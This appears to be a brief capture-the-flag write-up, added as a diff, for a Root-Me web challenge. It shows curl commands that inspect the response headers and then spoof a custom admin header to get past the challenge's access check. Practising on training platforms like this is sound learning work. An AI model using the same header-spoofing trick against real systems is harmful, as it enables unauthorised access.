@@ -1,0 +1,19 @@
+We need to look through headers.
+
+Use linux tool curl.
+
+curl -I http://challenge01.root-me.org/web-serveur/ch5/
+
+Result ->  
+HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 24 Aug 2017 09:11:23 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Vary: Accept-Encoding
+Header-RootMe-Admin: none
+
+Look at the header name Header-RootMe-Admin, it's value is set to none. We need to change it's value.
+
+Use curl for this
+curl -H "header-rootme-admin:123" http://challenge01.root-me.org/web-serveur/ch5/
